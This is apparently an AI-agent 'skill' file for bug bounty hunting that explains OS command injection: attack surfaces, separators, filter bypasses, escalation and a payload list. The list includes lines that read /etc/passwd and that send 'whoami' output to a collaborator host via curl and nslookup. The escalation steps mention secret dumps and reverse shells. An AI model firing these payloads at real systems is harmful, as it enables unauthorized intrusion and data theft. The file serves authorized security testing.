---
skill: command-injection
title: "OS Command Injection"
category: "Security · Web"
load_when: "command injection, os command injection, rce, shell injection, cmd injection, command execution, system()"
pack: SUPERAGENT V10
bughunt: true
---

# OS Command Injection

## Where it pays
User input reaching a shell = direct RCE. One of the highest-impact, highest-paying classes — a single confirmed injection often means full server compromise.

## Attack-surface signals
Features that shell out: ping/traceroute/nslookup tools, file converters (ImageMagick, ffmpeg, pdf), git/archive handlers, backup/export, "run diagnostic", filename processing, SMS/email via CLI, any param that ends up in `system()`, `exec()`, `popen()`, backticks.

## Methodology
1. **Separators:** try `;`, `|`, `&`, `&&`, `||`, `\n`, `%0a`, and subshells `$( )` / `` ` ` ``.
2. **Confirm safely:** prefer time-based (`; sleep 5`) or OOB (DNS/HTTP to your collaborator) over destructive commands.
3. **Blind:** no output? Use OOB (`;nslookup $(whoami).collab`) or time delay to confirm.
4. **Argument injection:** when you can't break out, abuse flags (`-o`, `--output`, `@file`) of the called binary (curl, tar, ffmpeg).
5. **Filter bypass:** `$IFS` for spaces, `${PATH:0:1}` tricks, quotes `w'h'o'ami'`, hex/`$'\x20'`, wildcard `/???/??t`.
6. **Escalate:** confirmed exec → read files, reverse shell (authorized labs only), env/secret dump.

## Payloads / probes
```
; sleep 5
| sleep 5
&& sleep 5
$(sleep 5)
`sleep 5`
;nslookup oob.collab.example
%0a id %0a
;cat${IFS}/etc/passwd
| curl http://collab/?x=$(whoami)
```

## Root causes
User input concatenated into a shell command · unsanitized filename/arg · use of `shell=True` / `system()` with interpolation · trusting a library that shells out.

## Validation gate
Demonstrate code execution: a measured time delay you control, an OOB callback from the target's IP, or command output reflected. A 500 error is not proof.

## Impact & chains
Full RCE → data theft, lateral movement, persistence. Chains with web/ssrf (internal pivot), cloud/cloud-misconfig (steal instance creds after exec), exploit-dev for a stable shell.

## 🧪 Try it locally
```bash
python3 ../../../tools/payload_gen.py cmdi --encode url
python3 ../../../tools/skill_router.py "command injection rce in ping tool"
```

→ Report with `../reporting/writeup.md` (CWE-78); validate with `../reporting/validation-gate.md`.
